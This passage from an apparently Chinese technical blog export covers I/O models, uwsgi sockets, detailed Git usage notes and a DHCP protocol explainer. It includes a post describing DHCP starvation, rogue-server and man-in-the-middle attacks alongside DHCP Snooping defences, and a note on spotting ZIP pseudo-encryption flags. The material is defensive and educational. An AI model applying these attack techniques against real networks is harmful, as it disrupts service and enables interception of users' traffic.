当用户进程发出recvfrom操作时，如果kernel中的数据还没有准备好，那么它并不会阻塞用户进程，而是立刻返回，从用户进程角度讲 ，它发起一个recvfrom操作后，并不需要等待，而是马上就得到了一个结果，用户进程通过结果判断数据是否准备好，如果没有准备好过段时间再次发送recvfrom操作，一旦kernel中的数据准备好了，并且又再次收到了用户进程的recvfrom调用操作，马上将数据从内核缓冲区拷贝到了用户进程缓冲区 I/O多路复用(I/O multiplexing) select，poll以及大名鼎鼎的epoll就是IO多路复用模型，其特点就在于单个系统调用可以同时处理多个网络连接的IO，它的基本原理就是select/poll/epoll这个function会不断的轮询所负责的所有socket，当某个socket有数据到达了，就通知用户进程 当用户进程调用了select/poll/epoll，整个进程会被阻塞，而同时，kernel会“监视”所有select/poll/epoll负责的socket，当任何一个socket中的数据准备好了，select/poll/epoll就会返回。这个时候用户进程再调用recvfrom操作，将数据从内核缓冲区拷贝到用户进程缓冲区 信号驱动I/O(signal driven I/O) 信号驱动I/O在网络编程中基本用不到这里就不做介绍了 异步I/O(asynchronous I/O) 用户进程发起aio_read操作之后，立刻就可以开始去做其它的事，从kernel的角度，当它受到一个asynchronous read之后，首先它会立刻返回，所以不会对用户进程产生任何阻塞，然后，kernel会等待数据准备完成，然后将数据拷贝到用户内存，当这一切都完成之后，kernel会给用户进程发送一个signal，告诉它read操作完成了"},{"title":"uwsgi中的http http-socket socket区别","date":"2020-12-06","updated":"2024-03-19","path":"2020/12/06/uwsgi中的http http-socket socket区别/","text":"在uwsgi的注意事项中有强调说http和http-socket是两个不同的“野兽”，这是什么意思呢?简单的说，如果我们想直接将uwsgi用作服务器（例如Apache和nginx那样）直接暴露在公网那么就使用http；如果有单独的服务器（例如Apache或者nginx），由服务器将请求转发给uwsgi处理，并且使用http协议，那么此时使用http-socket。 而socket配置项又是什么意思呢？首先，按照uwsgi文档给出的解释是：bind to the specified UNIX/TCP socket using default protocol.也就是说指定UNIX/TCP socket作为默认的协议（引）。 UNIX/TCP socket其实是两类socket。UNIX socket是进程间的通信（Inter Process Communication），但只在同一台机器上；TCP/IP sockets允许进程通过网络通信。（引） ![image-20201205222607336](uwsgi中的http http-socket socket区别/image-20201205222607336.png) ![image-20201205222618665](uwsgi中的http http-socket socket区别/image-20201205222618665.png) 在uwsgi中如果配置如下则是使用UNIX socket： 12[uwsgi]socket = /tmp/uwsgi.sock 如果配置如下则是使用TCP/IP socket： 12[uwsgi]socket = 127.0.0.1:8000 在nginx也是对应的配置(引)： 1234567# uWSGI socket（unix socket）uwsgi_pass unix:///tmp/uwsgi.sock;include uwsgi_params;# TCP socketsuwsgi_pass 127.0.0.1:3031;include uwsgi_params; 但是官方文档将两种形式写在一起了 12345[uwsgi]socket = /tmp/uwsgi.socksocket = 127.0.0.1:8000workers = 3master = true"},{"title":"GIT-note","date":"2020-11-23","updated":"2024-03-19","path":"2020/11/23/GIT-note/","text":"git init git add git commit -m “asdasd” git status git diff 用git diff HEAD -- readme.txt命令可以查看工作区和版本库里面最新版本的区别： git log 看到的一大串类似1094adb...的是commit id（版本号），和SVN不一样，Git的commit id不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的commit id和我的肯定不一样，以你自己的为准。为什么commit id需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，后面我们还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。 git log --pretty=oneline Git必须知道当前版本是哪个版本，在Git中，用HEAD表示当前版本，也就是最新的提交1094adb...（注意我的提交ID和你的肯定不一样），上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。 简而言之，执行 git reset HEAD 以取消之前 git add 添加 1git reset --hard HEAD^ git log再看看现在版本库的状态： 最新的那个版本append GPL已经看不到了！好比你从21世纪坐时光穿梭机来到了19世纪，想再回去已经回不去了，肿么办？ 办法其实还是有的，只要上面的命令行窗口还没有被关掉，你就可以顺着往上找啊找啊，找到那个append GPL的commit id是1094adb...，于是就可以指定回到未来的某个版本： 1$ git reset --hard 1094a 或者 1查看日志 `cat .git/logs/refs/heads/master`，`cat .git/logs/HEAD` 你回退到了某个版本，关掉了电脑，第二天早上就后悔了，想恢复到新版本怎么办？找不到新版本的commit id怎么办？ 在Git中，总是有后悔药可以吃的。当你用$ git reset --hard HEAD^回退到add distributed版本时，再想恢复到append GPL，就必须找到append GPL的commit id。Git提供了一个命令 1git reflog 用来记录你的每一次命令： 简而言之，执行 git reset HEAD 以取消之前 git add 添加 git reset 123456789$ git reset HEAD^ # 回退所有内容到上一个版本 $ git reset HEAD^ hello.php # 回退 hello.php 文件的版本到上一个版本 $ git reset 052e # 回退到指定版本实例：$ git reset --soft HEAD~3 # 回退上上上一个版本--hard 参数撤销工作区中所有未提交的修改内容，将暂存区与工作区都回到上一次版本，并删除之前的所有信息提交：git reset --hard HEAD –mixed 为默认，可以不用带该参数，用于重置暂存区的文件与上一次的提交(commit)保持一致，工作区文件内容保持不变**。谨慎使用 –hard 参数，它会删除回退点之前的所有信息。** 12git restore --stage readme.txt #丢弃当前暂存区的改动 但是不改变工作区git restore readme.txt # 丢弃当前工作区的改动，让这个文件和所在的HEAD仓库内容一样 类似于 git reset --hard参数 一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点： 每次提交，master分支都会向前移动一步，这样，随着你不断提交，master分支的线也越来越长。 当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上： 你看，Git创建一个分支很快，因为除了增加一个dev指针，改改HEAD的指向，工作区的文件都没有任何变化！ 不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变： 假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并： 所以Git合并分支也很快！就改改指针，工作区内容也不变！ 合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支： https://www.open-open.com/lib/view/open1328069889514.html 日志 1git log --graph --pretty=oneline --abbrev-commit 执行 git fetch origin master 时，它的意思是从名为 origin 的远程上拉取名为 master 的分支到本地分支 origin/master 中。既然是拉取代码，当然需要同时指定远程名与分支名，所以分开写。 执行 git merge origin/master 时，它的意思是合并名为 origin/master 的分支到当前所在分支。既然是分支的合并，当然就与远程名没有直接的关系，所以没有出现远程名。需要指定的是被合并的分支。 执行 git push origin master 时，它的意思是推送本地的 master 分支到远程 origin，涉及到远程以及分支，当然也得分开写了。 还可以一次性拉取多个分支的代码：git fetch origin master stable oldstable； 也还可以一次性合并多个分支的代码：git merge origin/master hotfix-2275 得到某个文件修改历史 git log xxxdev master 工作区某文件恢复到指定版本的时候: git restore -s [hash] xxxx.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [12:02:19] $ cat readme.txt git is version ontrol systemadd new lineadd twoadd 3rdgit is free softwoare# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [12:02:21] $ git status 位于分支 master无文件要提交，干净的工作区# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [12:02:23] $ cat test1 111# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [12:02:29] $ git restore f8ef5a0 readme.txt error: 路径规格 &#x27;f8ef5a0&#x27; 未匹配任何 git 已知文件# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [12:02:43] C:1$ git restore -help 用法：git restore [&lt;选项&gt;] [--source=&lt;分支&gt;] &lt;文件&gt;... -s, --source &lt;tree-ish&gt; 要检出哪一个树 -S, --staged 恢复索引 -W, --worktree 恢复工作区（默认） --ignore-unmerged 忽略未合并条目 --overlay 使用叠加模式 -q, --quiet 不显示进度报告 --recurse-submodules[=&lt;checkout&gt;] control recursive updating of submodules --progress 强制显示进度报告 -m, --merge 和新的分支执行三方合并 --conflict &lt;风格&gt; 冲突输出风格（merge 或 diff3） -2, --ours 对尚未合并的文件检出我们的版本 -3, --theirs 对尚未合并的文件检出他们的版本 -p, --patch 交互式挑选数据块 --ignore-skip-worktree-bits 对路径不做稀疏检出的限制 --pathspec-from-file &lt;文件&gt; 从文件读取路径表达式 --pathspec-file-nul 使用 --pathspec-from-file，路径表达式用空字符分隔# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [12:03:20] C:129$ git restore -s f8ef5a0 readme.txt # rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [12:04:14] $ cat readme.txt git is version ontrol systemgit is free softwoare 工作区某文件恢复到暂存区的版本 git restore xxx 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:49:11] $ cat readme.txt git is version ontrol systemadd new lineadd twoadd 3rdgit is free softwoare# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:49:19] $ git status 位于分支 master尚未暂存以备提交的变更： （使用 &quot;git add &lt;文件&gt;...&quot; 更新要提交的内容） （使用 &quot;git restore &lt;文件&gt;...&quot; 丢弃工作区的改动） 修改： .readme.txt.un~未跟踪的文件: （使用 &quot;git add &lt;文件&gt;...&quot; 以包含要提交的内容） test1修改尚未加入提交（使用 &quot;git add&quot; 和/或 &quot;git commit -a&quot;）# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:49:24] $ echo &quot;stup &quot; &gt;&gt; readme.txt # rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:51:54] $ git status 位于分支 master尚未暂存以备提交的变更： （使用 &quot;git add &lt;文件&gt;...&quot; 更新要提交的内容） （使用 &quot;git restore &lt;文件&gt;...&quot; 丢弃工作区的改动） 修改： .readme.txt.un~ 修改： readme.txt未跟踪的文件: （使用 &quot;git add &lt;文件&gt;...&quot; 以包含要提交的内容） test1修改尚未加入提交（使用 &quot;git add&quot; 和/或 &quot;git commit -a&quot;） # rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:52:28] $ git add readme.txt # rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:52:33] $ git status 位于分支 master要提交的变更： （使用 &quot;git restore --staged &lt;文件&gt;...&quot; 以取消暂存） 修改： readme.txt尚未暂存以备提交的变更： （使用 &quot;git add &lt;文件&gt;...&quot; 更新要提交的内容） （使用 &quot;git restore &lt;文件&gt;...&quot; 丢弃工作区的改动） 修改： .readme.txt.un~未跟踪的文件: （使用 &quot;git add &lt;文件&gt;...&quot; 以包含要提交的内容） test1# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:52:35] $ echo &quot;stupi&quot; &gt;&gt; readme.txt # rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:52:44] $ cat readme.txt git is version ontrol systemadd new lineadd twoadd 3rdgit is free softwoarestup stupi# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:52:54] $ git restore readme.txt # rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master x [11:53:02] $ cat readme.txt git is version ontrol systemadd new lineadd twoadd 3rdgit is free softwoarestup 取消暂存区的内容，不影响工作区 1git restore --staged &lt;文件&gt; git reset https://www.jianshu.com/p/cbd5cd504f14 git reset --soft 将HEAD引用指向给定提交。索引（暂存区）和工作目录的内容是不变的，在三个命令中对现有版本库状态改动最小。 git reset --mixed（git reset默认的模式） HEAD引用指向给定提交，并且索引（暂存区）内容也跟着改变，工作目录内容不变。这个命令会将索引（暂存区）变成你刚刚暂存该提交全部变化时的状态，会显示工作目录中有什么修改。 git reset --hard HEAD引用指向给定提交，索引（暂存区）内容和工作目录内容都会变给定提交时的状态。也就是在给定提交后所修改的内容都会丢失(新文件会被删除，不在工作目录中的文件恢复，未清除回收站的前提)。 新建分支 ， 切换分支,创建跟踪分支 由于git中分支仅仅是一个commit id的别名，所以checkout也可以切换到一个commit id 123$ git checkout aaa # 切换到 aaa分支 $ git checkout -b aaa # 创建aaa，然后切换到 aaa分支 $ git checkout commitid # 切换到某个commit id 新的switch命令用来接替checkout的功能，但switch不能切换到commit id 12$ git switch aaa # 切换到 aaa分支 $ git switch -c aaa # 创建aaa，然后切换到 aaa分支 命令查看当前分支 123git branch -a #所有分支-r 远程分支-v 查看分支：git branch 创建分支：git branch &lt;name&gt; 切换分支：git checkout &lt;name&gt;或者git switch &lt;name&gt; 创建+切换分支：git checkout -b &lt;name&gt;或者git switch -c &lt;name&gt; 12git checkout -b totallyNotMaster o/master #tot分支跟踪 远程mastergit switch -c xxx xxx 另一种设置远程追踪分支的方法就是使用：git branch -u 命令，执行： 1git branch -u o/master foo 这样 foo 就会跟踪 o/master 了。如果当前就在 foo 分支上, 还可以省略 foo： 1git branch -u o/master 合并某分支到当前分支：git merge &lt;name&gt; 删除分支：git branch -d &lt;name&gt; git cherry-pick 当前记录后面跟自定义提交 git cherry-pick &lt;提交号&gt;... 如果你想将一些提交复制到当前所在的位置（HEAD） 1234git checkout master;git cherry-pick C2;git commit --amend;git cherry-pick C3 git rebase 选分支挂在到指定分支后 -i重新排列 变基 123456git rebase [前驱分支] [要成为后继分支的分支]git rebase caption bugfix # 把bugfix分支挂在caption后git rebase [前驱分支] # 把当前分支挂在到后继分支 当前分支变基 还可以用来 fast-foward 123$ git checkout mywork$ git rebase originShell 这些命令会把你的”mywork“分支里的每个提交(commit)取消掉，并且把它们临时 保存为补丁(patch)(这些补丁放到”.git/rebase“目录中),然后把”mywork“分支更新 到最新的”origin“分支，最后把保存的这些补丁应用到”mywork“分支上。 当’mywork‘分支更新之后，它会指向这些新创建的提交(commit),而那些老的提交会被丢弃。 如果运行垃圾收集命令(pruning garbage collection), 这些被丢弃的提交就会删除. 命令的形式为: 1git rebase [startpoint] [endpoint] --onto [branchName] 其中，[startpoint] [endpoint]仍然和上一个命令一样指定了一个编辑区间(前开后闭)，--onto的意思是要将该指定的提交复制到哪个分支上。 所以，在找到C(90bc0045b)和E(5de0da9f2)的提交id后，我们运行以下命令： 1git rebase 90bc0045b^ 5de0da9f2 --onto master 注:因为[startpoint] [endpoint]指定的是一个前开后闭的区间，为了让这个区间包含C提交，我们将区间起始点向后退了一步。 git commit --amend 修改记录，但是不增加一个commit， 移动某个分支名到某个hash git branch -f [分支名] [hash] 选择父提交记录 操作符 ^ 与 ~ 符一样，后面也可以跟一个数字。 但是该操作符后面的数字与 ~ 后面的不同，并不是用来指定向上返回几代，而是指定合并提交记录的某个父提交。还记得前面提到过的一个合并提交有两个父提交吧，所以遇到这样的节点时该选择哪条路径就不是很清晰了。 Git 默认选择合并提交的“第一个”父提交，在操作符 ^ 后跟一个数字可以改变这一默认行为。 获取远程仓库 某个分支 3种方法 12从远程分支 checkout 出来的本地分支，称为_跟踪分支(tracking branch)_。跟踪分支是一种和远程分支有直接联系的本地分支。在跟踪分支里输入git push，Git 会自行推断应该向哪个服务器的哪个分支推送数据。反过来，在这些分支里运行 git pull 会获取所有远程索引，并把它们的数据都合并到本地分支中来。在克隆仓库时，Git 通常会自动创建一个名为 master 的分支来跟踪 origin/master https://blog.csdn.net/weixin_41287260/article/details/98987135 常用的克隆命令应该是这个: git clone &lt;url&gt;；这个命令其实是下面命令的简写形式：git clone -b master &lt;url&gt; 1. 对于比较少分支的仓库–方法1 思路：先查看远程分支，然后在本地创建和远程仓库同名的分支。 关键命令：git branch dev origin/dev或git switch -c dev origin/dev，即新建一个本地分支来跟踪远程的某一分支，创建该分支后，远程分支内容已拉取到本地分支。（或者你可以直接用git checkout -b dev origin/dev，创建分支，并切换到该分支） 2. 对于比较少分支的仓库–方法2 git clone -b readme url：下载该仓库的readme分支的内容。 3. 对于比较多分支的仓库 1for b in `git branch -r | grep -v -- &#x27;-&gt;&#x27;`; do git branch --track $&#123;b##origin/&#125; $b; done 删除远程分支 1如果不再需要某个远程分支了，比如搞定了某个特性并把它合并进了远程的 master 分支（或任何其他存放稳定代码的地方），可以用这个非常无厘头的语法来删除它：git push [远程名] :[分支名]。如果想在服务器上删除serverfix 分支，运行下面的命令： 12$ git push origin :serverfix To git@github.com:schacon/simplegit.git - [deleted] serverfix 1咚！服务器上的分支没了。你最好特别留心这一页，因为你一定会用到那个命令，而且你很可能会忘掉它的语法。有种方便记忆这条命令的方法：记住我们不久前见过的 git push [远程名] [本地分支]:[远程分支] 语法，如果省略 [本地分支]，那就等于是在说“在这里提取空白然后把它变成[远程分支]”。 添加远程库 要添加一个新的远程仓库，可以指定一个简单的名字，以便将来引用,命令格式如下： 1234567891011121314git remote add [shortname] [url]# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [17:16:29] $ git remote add origin git@github.com:991688344/Manjaro.git# rick @ rick-win-manjaro in ~/TMP/GIT-Learn on git:master o [17:17:52] $ git remote -v origin git@github.com:991688344/Manjaro.git (fetch)origin git@github.com:991688344/Manjaro.git (push)执行时加上 -v 参数，你还可以看到每个别名的实际链接地址。$ git remote -vorigin git@github.com:tianqixin/runoob-git-test.git (fetch)origin git@github.com:tianqixin/runoob-git-test.git (push) 显示某个远程仓库的信息 12345$ git remote show git@github.com:991688344/Manjaro.git* 远程 git@github.com:991688344/Manjaro.git 获取地址：git@github.com:991688344/Manjaro.git 推送地址：git@github.com:991688344/Manjaro.git HEAD 分支：main git clone git fetch git fetch 的参数和 git push 极其相似。他们的概念是相同的，只是方向相反罢了（因为现在你是下载，而非上传） 推送到远程仓库 git push 123456789101112131415$ git push -u origin master 枚举对象中: 16, 完成.对象计数中: 100% (16/16), 完成.使用 4 个线程进行压缩压缩对象中: 100% (15/15), 完成.写入对象中: 100% (16/16), 1.62 KiB | 331.00 KiB/s, 完成.总共 16（差异 3），复用 0（差异 0），包复用 0remote: Resolving deltas: 100% (3/3), done.remote: remote: Create a pull request for &#x27;master&#x27; on GitHub by visiting:remote: https://github.com/991688344/Manjaro/pull/new/masterremote: To github.com:991688344/Manjaro.git * [new branch] master -&gt; master分支 &#x27;master&#x27; 设置为跟踪来自 &#x27;origin&#x27; 的远程分支 &#x27;master&#x27; 由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。 要同时为源和目的地指定 &lt;place&gt; 的话，只需要用冒号 : 将二者连起来就可以了： 1git push origin &lt;source&gt;:&lt;destination&gt; 获取远程仓库 git pull = git fetch + git merge git pull命令的作用是：取回远程主机某个分支的更新，再与本地的指定分支合并， 将远程存储库中的更改合并到当前分支中。在默认模式下，git pull是git fetch后跟git merge FETCH_HEAD的缩写。 git pull origin foo 相当于： 1git fetch origin foo; git merge o/foo 还有… git pull origin bar~1:bugFix 相当于： 1git fetch origin bar~1:bugFix; git merge bugFix 简单的多人协作流程 最简单的协作方式之一：先在自己的特性分支中工作一段时间，完成后合并到自己的 master 分支；然后下载合并 origin/master 上的更新（如果有的话），再推回远程服务器。一般的协作流程如图所示： ​ 1. 其他人在我之前修改过远程仓库，本地代码版本落后 git pull 就是 fetch 和 merge 的简写，类似的 git pull --rebase 就是 fetch 和 rebase 的简写！ rebase 单条命令: git pull --rebase merge 单条: git pull 2. master被锁，需要pull request tag起锚点作用 ， describe寻找最近锚点 git describe 的语法是： 1git describe &lt;ref&gt; &lt;ref&gt; 可以是任何能被 Git 识别成提交记录的引用，如果你没有指定的话，Git 会以你目前所检出的位置（HEAD）。 它输出的结果是这样的： 1&lt;tag&gt;_&lt;numCommits&gt;_g&lt;hash&gt; tag 表示的是离 ref 最近的标签， numCommits 是表示这个 ref 与 tag 相差有多少个提交记录， hash 表示的是你所给定的 ref 所表示的提交记录哈希值的前几位。 当 ref 提交记录上有某个标签时，则只输出标签名称 最近锚点 HEAD指针分离状态 https://blog.csdn.net/start_mao/article/details/94722393"},{"title":"zip伪加密","date":"2020-11-06","updated":"2024-03-19","path":"2020/11/06/zip伪加密/","text":"实例 识别真假加密 无加密 压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为00 00 假加密 压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为09 00 真加密 压缩源文件数据区的全局加密应当为09 00 且压缩源文件目录区的全局方式位标记应当为09 00 参考文章1 参考文章2"},{"title":"DHCP服务器攻防","date":"2020-10-30","updated":"2024-03-19","path":"2020/10/30/DHCP服务器攻防/","text":"DHCP服务器的防攻击手段 （一）、DHCP服务器面临的安全威胁 DHCP在设计上未充分考虑到安全因素，从而留下许多安全漏洞，使得DHCP很容易受到攻击。在实际网络中，针对DHCP攻击的手段主要有以下三种： 1、DHCP饿死攻击 【攻击原理】：攻击者持续大量地向DHCP服务器申请IP地址，直到耗尽DHCP服务器地址池的IP地址，使DHCP服务器无法再给正常的主机分配IP地址 在PC机给DHCP Server发送的DHCP Discover 报文中有一个CHADDR字段，该字段是由DHCP客户端填写的，用来表示客户端的硬件地址（MAC地址），而DHCP Server 也是根据CHADDR字段来分配IP地址的，对于不同的CHADDR，DHCP Server会分配不同的IP地址，因为DHCP Server 无法识别CHADDR的合法性，攻击者就利用这个漏洞，不断的改变CHADDR字段的值，来冒充不同的用户申请IP地址，使DHCP Server 中IP池枯竭，从而达到攻击目的。 2、仿冒DHCP Server攻击 【攻击原理】：当攻击者私自安装并运行DHCP Server 程序后，可以将自己伪装成DHCP Server，这就是仿冒DHCP Server。它的工作原理与正常的DHCP Server 一模一样，所以当PC机接收到来自DHCP Server 的DHCP报文时，无法区分是哪个DHCP Server 发送过来的，如果PC机第一个接收到的是来自仿冒DHCP Server 发送的DHCP报文，那么仿冒DHCP Server 则会给PC机分配错误的IP地址参数，导致PC客户端无法访问网络 3、DHCP中间人攻击 【攻击原理】：攻击者利用ARP机制，让PC-A学习到IP-S与MAC-B的映射关系，让DHCP Server 学习到IP-A与MAC-B的映射关系，如此一来，PC-A与DHCP Server之间交互的IP报文都要经过PC-B进行中转。我们这里要了解交换机在转发数据包过程中，IP地址与MAC地址的变化过程，这个类似于MAC地址欺骗。由于PC1与DHCP Server之间的IP报文都会经过攻击者PC，攻击者就能很容易窃取到IP报文中的信息，进行篡改或其他的破坏行为，从而达到直接攻击DHCP目的。 （二）、DHCP Snooping 技术解决DHCP 饿死攻击 为了防止DHCP受到攻击，就产生了一种DHCP Snooping的技术，但DHCP Snooping不是一种标准技术，还没有统一的标准规范，所以不同品牌的网络设备上实现DHCP Snooping也不尽相同。DHCP Snooping部署在交换机上就相当于在DHCP客户端与DHCP服务器端之间构建了一道虚拟的防火墙。 我们前面讲到DHCP饿死攻击是攻击者不断改变CHADDR的字段来实现的，为了弥补这个漏洞，阻止饿死攻击，我们在端口下配置DHCP Snooping技术，对DHCP Request报文的源MAC地址与CHADDR的字段进行检查，如果一致则转发报文，如果不一致则丢弃报文。 配置命令为，进入连接客户端接口视图，输入命令dhcp snooping check dhcp-chaddr enable 如下图： 但是还可能存在另一种饿死攻击，就是攻击者不断改变CHADDR，同时改变源MAC，并让CHADDR与源MAC地址相同，这样也可以躲过源MAC地址与CHADDR的一致性检查。 （三）、DHCP Snooping 防止仿冒DHCP Server 攻击 在DHCP Snooping技术中，将交换机的端口分为两种类型，信任端口（Trusted端口）和非信任端口（Untrusted端口），交换机所有端口默认都是Untrusted端口，我们将与合法DHCP Server 相连的端口配置为Trusted端口，这样交换机从Trusted端口接收到的DHCP 报文后，会正常转发，从而保证合法的DHCP Server能正常分配IP地址及其他网络参数；而其他从Untrusted端口接收到的DHCP Server 的报文，交换机会直接丢弃，不再转发，这样可以有效地阻止仿冒的DHCP Server 分配假的IP地址及其他网络参数。 配置命令如下：进入与DHCP Server 相连的接口视图 [LSW2] int e0/0/2 [LSW2-E0/0/2] dhcp snooping trusted 如果恢复为Untrusted 端口，命令如下： [LSW2-E0/0/2] undo dhcp snooping trusted （四）、DHCP Snooping 防止DHCP中间人攻击 DHCP中间人攻击从原理上我们可以知道它其实是一种Snoofing IP/MAC攻击（ARP欺骗），所以要防止DHCP中间人攻击，就是要防止ARP欺骗。而运行DHCP Snooping的交换机会侦听（Snooping）往来于用户与DHCP Server之间的信息，并从中收集用户的MAC地址（DHCP消息中的CHADDR字段中的值）、用户的IP地址（DHCP Server分配给相应的CHADDR的IP地址）、IP地址租用期等等信息，将它们集中存放在DHCP Snooping 绑定表中，运行了DHCP Snooping的交换机会建立并动态维护DHCP Snooping绑定表。 如上图所示，DHCP Server给PC-A 、PC-B分别分配IP-A、IP-B，那么IP-A与MAC-A就形成绑定关系，IP-B与MAC-B形成绑定关系，并存入DHCP Snooping绑定表中。这时攻击者想让Server 学习到IP-A与MAC-B的映射关系，会发送不断发送ARP请求报文（ARP报文中源IP地址填为IP-A，源MAC地址填为MAC-B）。交换机接收到这个ARP报文后，会检查它的源IP地址和源MAC地址，发现与DHCP Snooping绑定表中的条目不匹配，就丢弃该报文，这样可以有效地防止Spoofing IP/MAC攻击。 配置命令为： [LSW2] arp dhcp-snooping-detect enable （五）、DHCP Snooping 与IPSG技术的联动 针对网络中经常存在对源IP地址进行欺骗的攻击行为（攻击者仿冒合法用户的IP地址来向服务器发送IP报文），我们可以使用IPSG（IP Source Guard）技术来防范这种攻击。在交换机使用IPSG功能后，会对进入交换机端口的报文进行合法性的检查，然后对报文进行过滤（检查合法，则转发；检查非法，则丢弃）。 DHCP Snooping技术也可以与IPSG技术进行联动，即对于进入交换机端口的报文进行DHCP Snooping绑定表的匹配检查，如果报文的信息与绑定表一致，则允许通过，如果不一致则丢弃该报文。 报文的检查项可以是源IP地址、源MAC地址、Vlan和物理端口号等若干组合。如在交换机的端口视图下可支持IP+MAC、IP+Vlan、IP+MAC+Vlan等组合检查，在交换机的Vlan视图下可支持：IP+MAC、IP+物理端口号、IP+MAC+物理端口号等组合检查。 配置命令如下： 在交换机的接口视图或VLan视图下输入命令：ip source check user-bind enable。 http://blog.sina.com.cn/s/blog_752281350101aeg4.html https://blog.csdn.net/feipeng45/article/details/101626779"},{"title":"DHCP协议","date":"2020-10-30","updated":"2024-03-19","path":"2020/10/30/DHCP协议/","text":"一、DHCP简介 1、产生背景：网络增大，手工配置存在很多问题【人员素质要求高、容易出错、灵活性差、IP地址资源利用率低、工作量大，不利于管理等】 2、DHCP相对于静态手工配置的优点【效率高、灵活性强、易于管理等】 二、DHCP的原理与配置 （一）、DHCP的基本工作过程【发现阶段、提供阶段、请求阶段、确认阶段】如下图： 【发现阶段】： ​ 在发现阶段，DHCP客户端会以广播的方式给自己所在在广播域中的DHCP服务器都发送一个DHCP Discover 报文，目的是寻找网络中的DHCP Server，并表示自己需要获得一个IP地址 ​ 此广播报文采用传输层的UDP 68号端口发送（封装的目的端口为UDP 68号端口），经过网络层IP协议封装后，源IP地址为0.0.0.0（因为此时还没有分配IP地址），目的IP地址为255.255.255.255（有限广播IP地址）。因为此时，DHCP客户端没有分配到IP地址，也不知道DHCP服务器或DHCP中继的IP地址，所以在DHCP DISCOVER报文中Ciaddr（客户端IP地址）、Yiaddr（被分配的DHCP客户端IP地址）、Siaddr（下一个为DHCP客户端分配IP地址的DHCP服务器地址）、Giaddr（DHCP中继IP地址）这四个字段均为0.0.0.0，如下所示。另外，从中可以看到，在CHADDR字段和DHCP选项中ClientIdentifier字段中都标识了DHCP客户端网卡MAC地址DHCP:Client Ethernet Address (chaddr) =08002B2ED85E 【提供阶段】： ​ 是网络中的DHCP Server响应所收到的DHCP Discover 报文，把准备提供的IP地址携带在DHCP Offer 报文中，并以单播的方式发送给DHCP 客户端（注意这里Offer 报文中携带的IP地址客户端还不能直接使用） 【请求阶段】： ​ DHCP客户端在收到的所有Offer 报文中选择接受第一个到达客户端的Offer（通常情况下选择第一个接收到的Offer） ，并向相应的DHCP Server 以广播的方式发送DHCP Request 报文，表示自己愿意接受该Offer （在这个DHCP Request 报文中携带有R上的DHCP Server 的标识—称为Server Identifier，表示DHCP Client 只愿意接受R上的Offer，R也是通过分析这个标识来确定DHCP Client 只愿意接受自己的Offer 而该二层广播域中其他的DHCP服务器也会收到DHCP Client 所发出的DHCP Request 报文，它们则通过分析这个标识来确定DHCP Client 已经拒绝接受自己的Offer） ​ 在DHCP request报文封装的IP协议头部中，客户端的 Source Address仍然是 0.0.0.0，数据包的 Destination 仍然是 255.255.255.255。但在DHCP request报文中Ciaddr、Yiaddr、Siaddr、Giaddr 字段的地址均0.0.0.0 【确认阶段】： ​ 如果在提供阶段所携带的IP地址能正常地分配给DHCP Client 使用的话，那么R会以单播的方式给DHCP Client 发送一个DHCP Ack 报文，此时DHCP Client 获取地址成功；但是如果因为一些原因，在提供阶段所携带的IP地址不能分配给DHCP Client 的话，这时R则会给DHCP Client 发送一个DHCP Nak 报文，而当DHCP Client 收到R的DHCP Nak 报文后，则表示获取IP地址失败，需要重新进入到发现阶段。 在DHCP客户端在获得了一个IP地址以后，就可以发送一个免费ARP请求探测网络中是否还有其它主机使用IP地址，来避免由于DHCP服务器地址池重叠而引发的IP冲突。以上四个阶段如图11-19所示，相当于DHCP客户端与DHCP服务器的四次握手过程。 当DHCP Client 正常获得IP地址后，如下图： 从DHCP Server 获取的IP地址有一个租约时间，DHCP协议规定租约时间缺省不少于1小时，通常情况下，租约时间缺省值为24小时。 在DHCP协议中规定，在缺省情况下，当DHCP Client 使用IP地址到达T1时（租约时间的1/2），DHCP Client会以单播的方式给R发送一个DHCP Request 报文（请求续租），当到达时间T2（租约时间的7/8，即租约时间的87.5%）之前，若DHCP Client 收到R的DHCP Ack报文，则续租成功，重新开始租约期的计时；若没有收到，则DHCP Client 